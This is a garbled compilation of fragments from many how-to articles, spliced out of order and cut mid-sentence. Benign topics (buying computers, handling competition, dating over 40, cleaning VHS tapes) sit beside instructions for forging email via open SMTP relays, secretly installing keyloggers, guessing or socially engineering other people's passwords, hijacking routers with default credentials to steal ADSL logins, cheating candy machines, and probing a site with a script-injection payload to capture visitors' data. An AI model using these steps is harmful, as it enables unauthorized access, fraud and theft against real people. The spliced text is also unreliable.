, If you find two or three offers that are fairly close in price, read the fine print. Many resellers offer extra deals, such as discount Apple Care warranties or free software. If you plan on purchasing the ""extra"" anyway, the nominally more expensive computer might be the better deal.


The Apple Store rarely offers this kind of deal on computers, except in the educational store.

, Upgrading the RAM on a new Mac computer can make it much faster, but buying the RAM yourself is much cheaper than getting it from Apple.All you need to install the RAM is steady hands, a screwdriver, and a set of instructions. We've got the last covered with guides for Mac Mini, iMac, and MacBook Pro.


Not all RAM is created equal. As of late 2015, DDR3 and DDR4 are the latest standards, and comparable in performance for home users., Buying a separate hard drive is generally cheaper than upgrading your Mac's hard drive size at the time of purchase. Just store the files you don't use as often on the backup.

, Mac laptop chargers are notoriously expensive. Unfortunately, the ultra-cheap options are usually knockoffs that overheat or fail after a short time. It's best to stick with chargers made by Apple.


Even used laptops usually come with a charger, so you don't need to worry about this for a while.

Act gracefully.,
Practice empathy.When you feel the pressure of competition, take a moment to consider how others feel as well.,
Use your sense of humor.Oftentimes the pressure of competition can be diffused with a joke.,
Avoid and recognize covert competition.,
Deal with others who play dirty.,
Keep some information private to reduce competition.In situations where personal competition is high, such as in schools or at work, it is important to remember that not all information needs to be shared.,
Create the right kind of environment.,
Determine the cause of competition.,
Acknowledge your frustrations and disappointments.If you want to deal with competition and the feelings it causes, it helps to determine exactly what kinds of stress you feel.,
Set your own goals.,
Expect to “win some, lose some.” No matter how hard you work or practice, you can’t expect to always win every game, get the highest grade, excel at work, etc.,
Focus on personal growth.,
Beat competition anxiety.,
Control stressors.,
Learn the benefits of healthy competition.,
Recognize unhealthy competition.",How to Deal with Competition," You can’t guarantee that you will always succeed, but you can take charge of how you feel. Whether you are at work, at school, playing sports, or in any other kind of competitive environment, focus on showing good character. Be proud of others’ efforts and your own, no matter who comes out on top. For instance:


Be a good sport.After playing a game, take a moment to congratulate other players and celebrate having a good time. Do this whether your win or lose.
Play fair. You won’t feel completely good about succeeding at something if you don’t play by the rules.
Avoid trash talking others in sports, school, work, etc.
Don’t be a sore loser. If you don’t win a game, or get that big promotion at work, or get the highest grade, you don’t have to complain about it. Focus on improving and achieving your goals in the future.;
, They may be in the same situation as you. By getting in the habit of thinking outside of your own goals and concerns, you will develop a healthier attitude toward competition.


To practice seeing the world from the perspectives of other people, ask yourself simple questions like “I know why I want to land this promotion—why might John Doe want it?”

, Laugh a little at yourself when you make a mistake, and focus on improving at your own pace.


For instance, if you are playing a game of basketball and you miss your tenth three pointer in a row, say something to poke a little fun at yourself, like “Wow, that ball just doesn’t feel like going in the net today.” Just move on, and then you can practice some during your free time if you want.

, Sometimes, competition isn’t as explicit as the struggle to win a game or award. Instead, people can express competitive attitudes more subtly through the things they say. This covert, indirectly aggressive type of competition can be just as stressful and is usually unnecessary.You can recognize and avoid instances of covert competition.


If your coworker gets a promotion that you really wanted, avoid indirectly aggressive statements like “Oh, I thought they wanted someone with more experience.” Instead, say something positive, like “Well, that sounds like a great opportunity for you.”
If you get a promotion and a coworker says something covertly competitive to you, respond with something like “I’ve been working really hard to get the skills and experience for this new position.”

, Dealing with cheaters and rule-breakers can be very frustrating when you are trying to do things fairly. This is especially so when the stakes are high, such as when you are trying to win a title or award. There are some things you can do individually as part of a group to reduce cheating and deception, however.Amplify the message that cheating is going on. You don't have to ""tell on"" someone individually, but if you notice something wrong going on, suggest that everyone go over the rules again.
Even if you have definitive evidence that rules have been broken, it may not be your job to call someone out. If you normally report to a supervisor, coach, or other authority figure, let him/her know about the problem and decide what to do about it.
Create a ""no cheating"" pact with your teammates, coworkers, etc. Studies show that pledging an honor code reduces the prevalence of cheating.
Be a good role model. Don't cheat, and don't condone cheating. You may not be able to stop all cheating at all times, but you will feel good about living up to standards you believe in.

, Keeping some information private can reduce feelings of jealousy and anxiety, and thereby unhealthy levels of competition. For instance,


Schools that publicly report test scores, such as on bulletin boards, don’t have to use student names when doing so. Instead, each student can be given a code, and scores can be printed next to each code. That way, each student will know his or her score, but not the scores of other students.
In the workplace, managers should decide on what types of information to keep private to reduce competition, including salaries, information from reviews and evaluations, etc.

, Those involved in a competitive field or situation often have the power to choose the atmosphere they want. If people work collaboratively instead of competing at all costs, there can be room for both healthy competition and growth for all.For instance:


You can draft a set of guidelines for competition in your school, workplace, etc. that everyone can agree on, like “No trash talking,” “Keep salary information private,” etc.
If you are training in a sport that pits one person against another, such as track and field, work with your coaches and fellow athletes to develop collaborative, peer training exercises where those with strengths in a certain area help others improve.

, If you are feeling the pressure of competition, it will help to determine the root of those feelings. You might already know what you want to achieve, such as winning a sporting event or becoming valedictorian. Even so, ask yourself why you want to achieve this goal. Possible reasons for wanting to compete include things like:Material value (getting a promotion means a raise at work)
Praise (teachers or parents will be happy for you if you get the highest score on an exam)
Prestige (becoming valedictorian increases your chances of getting into a top college)
Honor (winning more games means your team can get a sports title)

, You might face pressure from others, or just be hard on yourself. When you are feeling the burden of competition, stop and try to articulate your feelings with specific statements like:


“I’m disappointed that I didn’t when the game”
“I’m frustrated that others keep getting promoted over me at work”
“I feel like I study all the time and still don’t get the highest grades.”

, When all of your friends are running for valedictorian, you can’t all get there.To deal with competition in a healthy way, it is important to set goals that work for you, and to stick to them no matter what happens to other people. For instance, you can set a personal goal of graduating with a 3.8 or higher grade point average. If that means you become valedictorian, then great. But if you meet your goal, no matter who becomes valedictorian, you will feel successful.

, Dealing with competition means developing a healthy attitude toward both winning and losing. Be proud when you are successful, and don’t beat yourself up if you don’t always wind up on top. When you’re down, focus on past successes and a positive desire to improve in the future.


There are ways to develop your tolerance for both winning and losing. For instance, try playing some more games that are low-stakes or cooperative, like non-competitive team sports or cooperative board games., Keeping your long-term growth and overall sense of character in mind is an important part of dealing with competition. Instead of saying you can’t do something when you’re not instantly successful at it, put it into perspective.For instance, if you’re a great basketball player and decide to try out soccer, don’t be too hard on yourself if you don’t win at first. Remember that your long-term goal is to diversify the sports you play and become a better athlete overall.

, If the very idea of having to compete causes you stress, you may be experiencing competition anxiety. This often occurs before major competitive events, like games and examinations. If you start to worry about your performance or ability to succeed before such an event, you can deter anxiety by:Playing music that makes you feel energized and fired up.
Trying breathing exercises, such as breathing in through the nose and exhaling slowly through the mouth.
Avoiding negative or self-defeating thoughts, like “I’ll never be as good as John Doe.”
Encouraging yourself with positive thinking, like “I’m getting a little better at this every day.”

, If you are experiencing stress in some non-competitive aspect of your life, it can still interfere with your ability to perform in a game, at work, at school, etc. These stressors may not always in your control, such as when you or someone in your family is sick. You can manage stress and minimize its effect on competition by:Trying breathing exercises]
Contracting and relaxing your muscles
Trying visualization techniques

Practicing mindfulness meditation techniques

Utilizing positive self-talk, like “I can do this, no matter what!”, If you are having trouble handling any competition at all, it can be helpful to remind yourself of how it can be beneficial. When competition is executed and handled properly, it can help you do things like:Set goals
Learn limitations
Handle loss
Develop problem-solving skills
Learn cooperation

, On the other hand, when the stress of competition is too great, it has a detrimental effect. When you are involved in too many competitive activities, attempt to be the best at everything, or are pressured too much by external factors (coaches, parents, etc.), you might encounter negative feelings, like:Humiliation
Stress
Frustration
Anger
Jealousy

Spend time comparing the processor speed, memory, hard disk space, video card, and other components and features of each model that interests you.,
Look for alternatives.,
Check compatibility.,
Purchase your new computer.",How to Buy a Computer to Suit Your Needs," For example, are you a casual Internet user or a gamer? Think about what you'd like to accomplish on your new computer. Have you been dreaming of starting a new website with Flash? Do you play games online, or do you play the latest retail games when they are released?;
, If it's an expensive computer, optimized for something such as video editing, and you're not going to use it for editing videos, then don't buy it!


""Value"" line computers. These PCs are good for checking emails, surfing the web, and word processing, but they are not geared towards much else. Dell, HP (Compaq), Gateway, and other large-volume retail computers offer excellent values for a complete value series package.
""Enthusiast"" line computers. Computers of this category are suitable for most power-user tasks, multimedia, and casual gaming. Again, Dell and other major brands will be a good choice.
""Gaming"" line computers. These are best for media creation, workstation publishing, and intensive gaming. Typical tasks that require a fast computer include recording music and making Flash movies. Larger computer builders may not be the best choice, but a few of them such as Dell's XPS line, Dell's Alienware brand name, and Northwest Computers, might be good choices. Most users with needs in this category typically build their own PCs, purchasing individual parts from a computer component retailer such as Newegg.com.

, This will help you find the best deal.

, It's easy to miss out on opportunities if you're not looking for them. Do you have friends who are computer savvy? What about your neighbors? Do they build their own PCs? If you're looking for a powerful computer, purchasing all of the components and assembling it yourself is often less expensive than purchasing a package deal. If a friend is willing to help you build your own, it might be a worthwhile experience. Avoid this if all you need is a value line PC, because major brands will often get rid of their older components by bundling them in value line PCs.

, If purchasing components to build your own, double check each component's compatibility. For example, if you want to purchase a motherboard with an LGA775 socket, make sure you buy an LGA775 socket CPU. If in doubt, read user comments on products and research the different standards online. The most important compatibility considerations:


Motherboard: CPU socket type, graphics card slot type (PCI-E or AGP), and memory type and speed
CPU: Intel or AMD, and the socket type (ie: AM2, LGA775, 478, etc.)
Memory: Type (DDR or DDR2) and speed (ie: PC3200/DDR400 or PC2-6400/DDR2800)
Power supply (often included with a case): how many watts do you need for your components?

, Major brands such as Dell provide a web-based configuration tool for customizing a PC before you purchase it. This may be a more relaxing experience than being rushed by a sales representative over the phone. If there is something you don't understand when configuring your PC, call that company's sales line for answers.

On the other hand, if you have a huge computer you may want a bigger desk. It’s important to think if you want your computer case on or under your desk. It also depends on the monitor you use. It must also include space for a printer, a scanner, a keyboard and a mouse.
, If you’re the kind of person to gather around books, papers and diverse objects you have to find a desk with lots of various compartments to fit all these items. If the objects surrounding you are in limited number, than you can go for a simple one-drawer model or just a table., The variety of shapes for these desks is greater than you may think. When making this choice, consider the exact spot in your office where the desk is going to be placed. Remember you need access to it. If it’s going to fit in a corner, it can have a triangular shape or it can be L shaped or a more complicated shape that partially surrounds your chair. If it’s against a wall, you may need a square desk., You must be comfortable when using your computer, therefore your desk should be a comfortable space. Think of your postures and the things you need to do: type, stare into the monitor, print something etc. Your hands have to have a relaxed position, the distance between your eyes and the monitor should be carefully considered, any extra moves you ought to perform during repetitive activities involved in your computer work, as you probably don’t want to bend over the table 50 times a day to press a certain button etc."

Present the best of you possible.,
Boost your self-esteem.,
Go where the opposite sex hang out in your age range.,
Check out the Internet.,
Don't rush the process.,
Move forward.,
Don't get discouraged if you can't find ""the one right away"".",How to Date when You're over 40," Skip the doughnut, go to the gym, get your hair done.  Some may say that they really don't want anyone who judges them by their looks, however, appearance is what attracts a potential mate to you, be it male or female. It doesn't hurt to increase your odds, especially as the odds are against us in this age range.;
, If you don't believe in yourself, how can anyone else? And if having self-esteem is not your forte, then try being positive. If you smile and try to be an optimist, others will be attracted to you as you make them feel good. Feel free to give out compliments. Others will return the favor and you should see your own self-esteem skyrocket as well.

, 


For example, if you are female, the chances of you finding a man over 40 when you go out with your daughter to a baby supply store are slim to nil, whereas the chances of you meeting a male over forty increase considerably when you go with your son to a sporting goods store to buy him a hunting rifle.  The same can be said of where you choose to eat out for lunch. A better option would be a pub instead of a French restaurant. It would be useful to think, ""What interests men? That is where I will find them."" 
The same goes for men over forty seeking women. Don't expect to find many quality women over forty at the local bar. Though it can happen, it is unlikely. Your best bet would be again to think of what interests most women in their forties have. For example, some enjoy book clubs, others enjoy shopping at department stores.  It would be in your best interest to find something compatible with your own interests.  If you've always wanted to try scuba diving and notice the sign-up sheet has many female names listed, this might be the time to try that hobby.

, Online dating is another option. Of course, no matter how attractive you look at forty, it won't do you any good unless you leave your house to date.  When using online dating services it's important to put safety first , just as you would in any dating situation. After this, choose a site that best meets what you want in a potential mate.  While a site that caters to ""rednecks"" might not fit your style, neither so might a ""sugar daddy"" site. 


Check the site out. Before you even put your photo up for inspection, it would be a good idea to check out the profiles of the opposite sex on the site. Does this site meet with your idea of dating? Do people seem to quick to sleep together or do they seem to fast to marry? 
Choose a site that meets your comfort level. You may have to pay a monthly fee to get the quality of site that interests you. 
Get to know people. Talk a lot. Don't give out personal information, but do get to know the likes, hobbies, interests and other determiners of compatibility. When you do feel comfortable meeting, again follow the safety rules and meet in a public place. 
It would be wise not to sleep with your date at the first meeting if you would like to continue the relationship. What your mother told you is usually true. Respect comes with time. And time spent online does not count in this instance.

, Just as there is no reason to sleep with the opposite sex on the first date, there is also no reason to push or be clingy as well. Know that this relationship might work out for the two of you, but know also that at the initial stages, it could go either way. Keep your options open to other potential mates until both of you feel that you are ready to move into a monogamous relationship. Your best bet would be to call, but not too frequently or for too long at this stage of the game.


Texting seems too intrusive at this stage of the game. You may want to hold off on this until in a committed relationship. Wanting to know where your date is every minute of the day can push them away from you instead of closer, until you are ready to commit.

, If it works out, great! If not, try not to repeat the same mistakes you made, if any at all. If you spoke too much of your deceased grandmother, for instance, during a dinner date, you may want to speak of a less morose topic with your next prospect. Also, potential partners will usually tell you if they are interested in finding ""the one"", having another child or merging finances. If none of this is for you, your best bet is to move on as quickly as possible. To say you want something that you don't really is just wasting not only your time but that of your date. 


If you have children, the first date or first many dates is not the time to introduce them. It is wise to wait until you feel that the relationship could move into something committed. Your children (even grown ones) may not like your new partner or vice versa. You want to make certain that you have a good foundation laid before you introduce their opinions on the one in which you have fallen in love. 

, There is no time limit on dating.  Many in their 80's find romance and love. It seems the less you stress about finding ""the one"" the easier it will likely become for you. If it's meant to be, it will happen, regardless of your chances of being struck by lightning. Enjoy!

Understand what you are looking for.,
Find a list of SMTP servers.,
Test the SMTP server.",How to Forge Email1," An SMTP (simple mail transfer protocol) server is a mail server that transfers mail between users. Mail often bounces through several SMTP servers on its way to its destination. You will need to find a SMTP server that allows for ""open relaying"". This is next to impossible these days, but you may be able to find one or two out there.;
, There are several places online that you can find lists of popular SMTP servers. Finding an open relay one will be more difficult, and will require a lot of trial and error. Try small businesses and local companies, as they are less likely to have configured their SMTP server properly.


Using an SMTP server without authorization is illegal.

, You need to find out if the SMTP server is open before you can connect to it. Open the Command Prompt or Terminal. Type telnet smpt.server 25 and press Enter.Replace smpt.server with the address of the server you are trying to connect to. For example Google's SMTP server is smtp.gmail.com (it's not an open relay server, so don't bother trying).
If the SMTP server is an open relay, you will be connected to the server. If the server is not an open relay, you will see the message Could not open connection to the host on port 25: Connect failed and will need to find another server.

Compare.,

Consider other possible costs.,
Macs are also very different from Windows.",How to Decide Whether a PC or a Mac is Right For You," First of all, you need to compare the two choices. You need to think carefully about what you will benefit from buying a PC or a Mac. Are you using it for entertainment purposes (music, movies, games) or for business or education purposes? What you're going to do with your computer should reflect what suits you.;
, Macs are generally more expensive, but usually need less maintenance (viruses, hardware malfunctions, etc.) However, PCs are usually less expensive but may have more costs (monitor - see below, hardware repair, virus repair) This is not to say that PCs always have hardware issues and that Macs never do, but it is less likely for a Mac to have the issues that PCs do. Also, if a Mac has hardware issues, you will probably have to have it sent away for repairs, whereas a PC is easier to open up and fix the problem yourself.

, There may be other costs to consider when buying a computer, like the cost of a monitor, speakers, microphone, or webcam. Most Macs have these features built in. Also consider space for peripherals. Macs usually have fewer USB/FireWire/Audio jacks than a PC does, warranting the cost for hubs and attachments if extra space is needed. Also, on a Mac, software for video editing, music production, website design, photo management, DVD production, video capturing, etc. is included. On a PC, some of this software is omitted or some of the functionality you would get on a Mac is not available in that program. Some may consider software like this unnecessary, in which case a PC would be right for you.

, As a first time Mac user, it will be hard for you to adjust to whole different layout and functions, and Vise versa. Make sure you watch different tutorials and read more into Macs/PCs before buying one.

Search for a keylogger program.,
Select a reputable keylogger program.,
Download your selected keylogger.,
Install the keylogger.,
Activate the keylogger.,
Check the keylogger's results.",How to Find Out a Password1," You can do so by typing ""keylogger"" into a search engine and reviewing the results. A keylogger is a hidden application that runs in the background of a computer's operating system. While doing so, it makes a note of every single time they type a key, meaning you'll have a log of their usernames and passwords if they visit the pertinent sites., If you don't know where to start, Best Free Keylogger and Revealer Keylogger Free are both safe options.Before downloading software to your computer, try to make sure the website isn't a scam.
For around $100, you can buy a critically reviewed keylogger.

, You'll want to do this on computer from which you need the password if you can. If you've chosen a paid option instead of a free one, enter your payment information.



Use PayPal for this transaction if at all possible.
If you don't download the keylogger directly to the computer on which you need it, you'll end up having to move it to said computer on a USB drive.

, To do this, you'll double-click the keylogger setup file and follow the on-screen instructions. More so than most programs, it's very important to read the details of software use and the licensing agreement in your keylogger's installation window when it comes up. You need to make sure you aren't accidentally signing up to have the contents of your keylogger distributed online (or something similarly undesirable).

, After the application is running, you'll probably have the option of ""hiding"" it from view. If you can, hide the application and let it do its job in the background.

, Depending on how much use the computer in question gets, you may want to give it up to a week before checking back.


Depending on the keylogger you choose, you may not have to dig through the data that much--some keyloggers list sites' names as they're visited.
If you download a simple keylogger that just logs keystrokes, you'll need to search through the data until you find recognizable login information (e.g., a username or phone number).

, Type RCPT TO:recipientaddress@server.com. Make sure that your recipient's address is entered correctly.

, Type DATA and press Enter to start entering the actual data of the email. This will let the SMTP server know that you are entering the data of the email.

, The first thing you will need to do when you start entering data is to create your fake header. This will appear at the top of the email that your recipient receives. Enter the following information, replacing the data with your desired content:


Type Date: DD Mon YY XX:XX:XX and press Enter. Replace DD Mon YY XX:XX:XX with the date you want to use. For example Date: 17 Jun 07 12:24:13

Talk to people who might know the password.",How to Find Out a Password2," If you have access to the physical machine from which the account holder works, they may store their commonly-used passwords in a document somewhere.


Most computers allow for a cursory search of documents from within a search bar (PCs) or the Finder app (Macs). Try typing in keywords like ""password"", ""account"", and ""user name"" (or ""username"").Be sure to search for hidden files as well.

, This can be information ranging from their date of birth to their favorite pet's name. The goal here is to figure out possible answers to their security questions as well as candidates for their password itself.


For example, their favorite pet's name followed by a number might be a password.

, If you can't figure out their password based on general guesses and they don't have an explicitly labeled password file on their computer, try using everything you know about them to guess the password. Some helpful information may include the following:Personal information (e.g., their favorite pet's name) - This can help you guess their security questions, which often allow you to bypass a password if you enter them correctly.

Social media details - If you're friends with them on social media (or you know someone who is), their likes and interests listed there may be reflective of the answers to their security questions as well.

, Especially if you are a parent attempting to view a child's account or an employer investigating fraud, you probably have the authority to speak with people who may know something about your target password.

Confirm that the password creator uses a password manager.,
Open the password manager.,
Try entering an account's username.",How to Find Out a Password3," You can do this by typing ""Password Manager"" into the computer's search bar (or Finder app). Password managers store and apply commonly-used passwords for the appropriate services (e.g., Facebook or Google). Common password managers include the following:


Keychain
Google Smart Lock
Stored browser information

, In most cases, this will be password-protected. If you know the password, you can easily view and apply any saved passwords to their appropriate services.


If you don't know the password, you'll have to rely on autofill data for the website or program you're attempting to log into.

, If the account you're trying to access has a saved password associated with it in your selected browser (or program), it may automatically enter the password for you once the username is entered.


Google Chrome and Mozilla Firefox both do this if the user has the cookies and autofill features enabled.
If the account holder's computer is a Mac and you have their Keychain password, you may be able to use Keychain to access their stored passwords by navigating to Keychain Access (it should be in the Mac's Utilities folder), opening the ""Passwords"" tab on the left side of the screen, and selecting the pertinent password. After entering your Keychain password, you'll have the option to display the password in plain text.

Review your password recovery options.,
Make sure you have the information needed to reset the password.,
Follow the on-screen instructions.",How to Find Out a Password4," This will usually be somewhere below (or in the general vicinity of) the ""Password"" field.

, Most accounts will allow you to reset your password in one or more of the following ways:


By receiving a password link via phone (SMS)
By receiving a password link via email
By answering security questions

, This is where knowing as much about the password creator as possible will come in handy. Failing that, you'll need physical access to the password creator's phone or email address.


If they use an iOS device that's synced to the computer you're on, you may be able to view the password reset link in the Mac's messages. This is a risky move since it also alerts the password creator that you're altering the password.

, As long as you have everything you need to successfully receive the password reset link (or to answer the security questions), you should be able to reset the password, thereby gaining access to the account.

For older PSPs, open the battery compartment. To the right of the Sony logo, you will see “PSP-XXXX.” All you will need to know is if it is a 1XXX, 2XXX, or 3XXX model.
For the PSP Go, you can find the model number by flipping open the display and looking in the upper left-hand corner. It should say N1XXX.
The ideal model is 2XXX or older model. 3XXX and the PSP Go can be hacked, but you will be slightly limited in what you can do.

, In order to start the hack, you will need to make sure your PSP is updated to version 6.60. You can either use the system update function, or download the file directly from the | Sony site.


If you download the update file from the Sony website, copy it to the PSP by connecting the PSP to your computer. Copy the file into the PSP/GAME/UPDATE/ folder and then run the update file from the PSP.
To copy files onto a PSP, you will need to put your PSP into USB mode.

Listen for a click as the machine releases a piece of candy, then turn the knob back to its original position.If the machine's wheels are misaligned, the coin will still be there, so you can repeat this motion.

, You'll need the smallest one you can find, or a similar thin, rigid object such as a file or large paper clip. Stick the tool into the top of the slot, where the coin would normally fall when the knob is rotated. Probe around for a small plastic catch and push it upward. This should let you rotate the knob without putting in a coin., If your candy machine is the type that lets you pick up candy with a claw, you typically get several tries per coin, but only until you earn one item. If you catch the item before it hits the bottom of the dispenser, the machine won't detect the item, and will give you the maximum number of tries before you need to put in another coin."

, Avoid using names, birthdays, home addresses, or real words in your password, as these are easy to guess. To ensure security, your password should be a combination of words and letters, preferably in a totally random order. The longer and more random your password is, the better.

, If you use the same password for your email, your online banking, and your Facebook account, then it will be easier for people to hack into all of your information once they have discovered one of your passwords.

, If you suspect that somebody else has your login information, then you should change your password immediately to prevent them from hacking into your account without your permission.

, This is especially important if you are logging into your account on somebody else's computer or mobile device. You may even want to consider logging out of your account on your own computer each time, especially if you know that somebody else will be using your computer.

, The firewall will alert you anytime information on your computer is being sent out to a third party and ask for your permission first.

Try keywords and dates.,
Remember some basic password tricks.,
Try some universal passwords.",How to Get Someone's Facebook Password3," Many people build passwords off of important names and dates in their lives. These could be pet names, birthday dates, house numbers, and more. If you know your target pretty well, try various combinations of important keywords and dates.

, There are a few tricks to keep in mind when trying to guess a password:


If the password has numbers in it, it will usually be ""1"" or ""2"" and will typically be located at the end of the password.
If the password has a capital letter in it, it will usually be the first character, followed by a vowel.
Women tend to use personal names, while men tend to use hobbies.

Find a program that will ping a range of Internet IP addresses in a short time and that will return the results in a list.,
Found out what is your typical area IP range like, as this will assure that you get a local ISP account.

,
Use that IP range in the network scanning application to ping all the IP addresses in the range.,
Most of the IPs returned by the network scanner are Internet routers.

,Open a web browser like Firefox or Internet Explorer, start at the top of the list of IP addresses and try to connect to an IP by typing ""http://"" followed by the IP address.,
If the browser returns a login window with a prompt for username and password, it means that you have connected to an Internet router.,
Next, you must gain access to the router's web interface by logging in.,
Using the make and/or model: go to the appropriate website for the router and find out what is the default username and password.,
If the default username and password is accepted then your page will be directed to the router web interface.,
Many router interfaces (especially older routers) do not encrypt the HTML code of the interface, allowing you to view the code of the page with ease.

,
Once you have gained access to the router web interface, view the page source code by right clicking on the page and selecting either something like: ""View Page Source"" in Firefox or ""View Source"" in IE.

,
Now you have to find the username of the ADSL account the router is using to dial to the internet.,
If you cannot find a username with password in the page code, try another IP address.

,
If you find a username and password, try to use it yourself to dial a broadband connection.

",How to Get a Free ADSL Account," A good network scanner to use is netscan.;
,, (For Example: 127.0.0.1 to 192.168.0.255)

,, (Example: http://127.0.0.1) and hitting enter.


, If you do not receive a login window, use the next IP address from the network scanner.

, The login window will, in some cases, indicate the router's make and/or model.

, Most routers are sold with login credentials: 'admin' and 'admin', but may vary from router make to make and model to model. This will only work if the router owner has not changed the default login credentials, which is surprisingly common.

, If the default username and password doesn't work, then try another IP address.

,,, The username will look something like: thename@aisp.com or something like that. If you find such a username, the password will follow soon after it if not encrypted. You will maybe have to find the page where the username and password is stored, so going through each page of the web interface might be required.

Regularly check your Account Activity!,
Don't lose hope!",How to Defend Your Gmail Account from Malicious Hackers," Don't tell even the most trustworthy of friends, for a mere slip of their tongue could give a clue of your password to hackers.;
, Let's assume you've been posting tons of stuff about your favorite thing on Facebook or Twitter. If your password is related, it makes it much easier for a hacker to guess your password. Therefore, as much as you want to, do not use a password related to something you like or what you post. Make it an extremely long, nonsensical, and unexpected garble of capital/lowercase letters, numbers, and preferably symbols. Of course, if you know you have a bad memory and won't remember the password, don't make it too arcane. You don't want to be locked out of your own Gmail account! There are many short but hard-to-crack passwords. Also, don't use your account password on any other accounts. Don't keep any password information for your other accounts on Gmail. Otherwise, the hacker(s) can crack into even more sensitive information, such as your bank account.

, If a hacker is determined enough, they will eventually succeed. But Two-Step Verification makes it so much harder for them to crack into your account! Not only will they have to guess your password, they will need access to your phone. A text message or voice call with the verification code will be sent to your phone each time someone (or even you) tries to sign in to your account from a non-trusted computer. Unless you have hateful, hacking siblings and/or parents that share your computer, make your computer trusted! Otherwise, you will have to look at your phone and type in the verification code every single time. It is especially necessary if you have siblings skilled in hacking, which is a common case. Make every other computer untrustworthy! That means, even if it's your far off uncle's computer! And of course, a backup code will never hurt in case you do not have access to your main phone.

, If hackers even with a verification code are doing suspicious things on your account, this will lock them out of your account.

, Your IP address will be displayed on the bottom. And for the sign in details, it should have your IP address (unless you went elsewhere). Let's say you're in Nevada, and you use Google Chrome. If you checked the account activity and it showed an IP address from Rhode Island and the browser was Mozilla Firefox, your account was most likely compromised. Just because you set the alert preference to alert you for strange activity doesn't mean you're safe, of course. The most skilled hackers can make their activity seem completely innocent while ruining your account.

, There is always a chance. If you have a recovery e-mail address, use it to send a message to Gmail about the compromising of your main account. If they take it seriously, your account should be safe in a little while. The other way to use your recovery e-mail if your password was changed is the e-mail it receives upon the Gmail account's password being changed. If you did not change it, it means someone else did. In that message is a link to change your password. Immediately change it. If the hacker(s) already sent messages to all your contacts (for example, to send them money), contact them as soon as possible and let them know any such messages are scams.

Set the rules to have each finger stands for a single binary digit.",How to Count on Your Fingers Using Binary Numbers1," Specifically (1, 2, 4, 8, ... (doubling each time)). Using this method, you can count to 1,023 on your hands. It takes a lot of effort, however. This is the highest possible where each finger can only be up or down and you only use fingers (it is possible to have the orientation of the hand itself mean something or to have fingers that are up, down). This is the highest possible because each position corresponds to a single number, and no two positions correspond to the same number.


Example 1: The first six fingers is the number 111111base2 --> 1+2+4+8+16+32 = 63base10 ...
Example 2: Ninety-nine is the first seven fingers with only the 1st two and last two extended is the number 1100011base2 --> 1+2+0+0+0+32+64 = 99base10 ...

Note: The formal definition of binary uses exponents for the place values which are powers of 2 meaning based on 2n for n = 0, 1, 2, 3, ... so that is equal to 20, 21, 22, 23, ...

If you're unsure how yours works, refer to the instruction's manual., Once the tape has run one cleaning cycle, remove the tape from the machine. Use a Phillips head screwdriver to remove the screws from the casing that houses the film. After removing all the screws, separate the casings so you can reach the reels and film found inside. Sometimes, tapes will have a sticker or seal on the side to keep the casing together. If your tape is sealed, use a small knife to gently slice open the seal to open the tape.
The majority of tapes can be opened with a Phillips head screwdriver. However, if a Phillips screwdriver does not work, use a flathead screwdriver instead.
Store the screws in a safe place as you'll need them later to reassemble your tape.

, Dip a Q-tip in a small amount of isopropyl alcohol. Swab the sides of the casing and around the empty reel to remove mold, dirt, and debris.Avoid cleaning near the reel that the film is currently wrapped around. Only use your tape cleaner to remove mold from the film itself.
You can purchase isopropyl alcohol at most drug stores.

, After running the tape through the cleaner again, you will clean the other reel. Therefore, do not screw the tape back together yet. Simply place the casings together again so they're loosely secured., Place your tape in the cleaner as you did before. This time, allow the tape to fast forward completely to remove any mold remaining on the film. Simply place the tape in the cleaner and then press the cleaning button., Once the tape runs through the cleaner again, remove it and open it up. Again, dip a q-tip in isopropyl alcohol. Use this to clean the empty real and around the interior of the casings. Remove any lingering mold, dirt, or debris.Remember not to clean near the reel that contains the film.

, Place the casings back together. Place the screws back in place. Use your screwdriver to securely screw the tape back together.If your tape had a sticker in place as a seal, it is not necessary to reseal your tape after cleaning it.

, You should always end the cleaning process with a rewound tape. Pop the tape back in the cleaner one last time. Rewind it to the beginning. When you're done, your VHS tape should be clean and ready to watch.Keep in mind, no method is ever 100% successful. Very dirty or damaged tapes may not come completely clean. You may need to consult a professional if your tape remains dirty or will not play after using a tape cleaner.

Allow tapes to dry if they're wet.,
Put on cotton gloves.,
Pull out about a foot of tape.,
Wipe down the tape.,
Continue until you've cleaned all the tape.,
Twirl the reels to get the tape back in place.",How to Clean Vhs Tapes2," Never attempt to alter a dirty VHS tape when it's wet. Handling wet film can cause damage. If you find an old VHS tape that's been damaged by water, place it in a clean, dry space. Allow it to dry completely before attempting to clean it manually., Never handle film with your bare hands. This is an easy way to damage a VHS tape. Put on a pair of clean cotton gloves before attempting to manually clean VHS film.Make sure the gloves are clean. Dirt and debris on your gloves can easily rub off onto your film.

, Lift open the side of the tape where you can see the film running from one reel to another. Very carefully pull out about a foot of film. Do not pull out more than a foot of film at a time, as this is likely to cause tangling.It can help to place one hand in the holes of the casing near the reels. Manually twisting one reel while pulling at the film will help the film come out slowly and gently, preventing damage.

, To manually clean the film, wipe down both sides with a tissue or cotton cloth. Be very gentle when cleaning film and avoid using chemical cleaners. Try to remove dirt and debris without the use of liquid-based cleaners.Remember, this method is best used as a last resort. An electronic tape cleaner works best to clean VHS tape film.

, Once one foot of tape is clean, twist the reels to pull the clean tape back in place. Then, gently pull out another foot of tape. Again, clean both sides of the tape with a tissue or cotton cloth, wiping off any obvious dirt and dust., Once you've finished cleaning the last foot of tape, gently twist one reel. This should pull the tape back in place. Keep twisting until the film is secured snuggly in the casing.Which reel you twist depends on whether the film is fast-forwarded or rewound. You should be able to figure out which reel to twist based on which reel pulls the film inward.

Be careful when handling VHS tapes.,
Store your VHS tapes in a cool, dry place.,
Rewind VHS tapes each time you watch them.",How to Clean Vhs Tapes3," In general, the less you handle VHS tapes, the better preserved they'll be. VHS tapes can become damaged from being dropped or handled roughly. Be very carefully when moving your VHS tapes and only handle them when completely necessary., VHS tapes should be stored in a cool, dry place. This helps prevent the build up of mold. Keep them away from direct sunlight and do not store them near windows. A comfortable room temperature is usually safe for VHS tapes.Magnets and speakers can erase VHS tapes. Keep your tapes away from these devices when storing them.

, Leaving a tape paused in the middle can stretch out the film. Make sure to completely rewind VHS tapes after each use. This will preserve your VHS tapes over the years."

, You will need to type some special code into the “post” which will capture the data of all who click on it.


You’ll want to test to see if the system filters out code. Post

<script>window.alert(“test”)</script>

If an alert box appears when you click on your post, then the site is vulnerable to attack.

